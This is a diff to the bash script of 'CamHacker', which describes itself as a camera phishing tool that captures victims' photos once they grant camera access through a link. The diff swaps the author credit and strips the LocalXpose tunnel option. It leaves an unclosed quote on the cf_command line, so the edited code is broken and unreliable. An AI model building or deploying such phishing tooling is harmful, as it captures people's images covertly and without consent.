@@ -3,7 +3,7 @@
 # CamHacker
 # Version    : 1.5
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
+# Author     : iTeach-Termux 
 # Github     : https://github.com/KasRoudra
 # Email      : kasroudrakrd@gmail.com
 # Credits    : Noob-Hackers, TechChipNet, LinuxChoice
@@ -74,16 +74,9 @@ ${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
 ${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
 ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${red}                                            [v${version}]
-${blue}                                    [By KasRoudra]
+${blue}                                    [by iTeach-Termux]
 "
 
-loclx_help="
-${info}Steps: ${nc}
-${blue}[1]${yellow} Go to ${green}https://localxpose.io
-${blue}[2]${yellow} Create an account 
-${blue}[3]${yellow} Login to your account
-${blue}[4]${yellow} Visit ${green}https://localxpose.io/dashboard/access${yellow} and copy your authtoken
-"
 
 # Check for sudo
 if command -v sudo > /dev/null 2>&1; then
@@ -96,13 +89,10 @@ fi
 termux=false
 brew=false
 cloudflared=false
-loclx=false
 cf_command="$tunneler_dir/cloudflared"
-loclx_command="$tunneler_dir/loclx"
 if [[ -d /data/data/com.termux/files/home ]]; then
     termux=true
-    cf_command="termux-chroot $tunneler_dir/cloudflared"
-    loclx_command="termux-chroot $tunneler_dir/loclx"
+    cf_command="termux-chroot $tunneler_dir/cloudflared 
 fi
 if command -v brew > /dev/null 2>&1; then
     brew=true
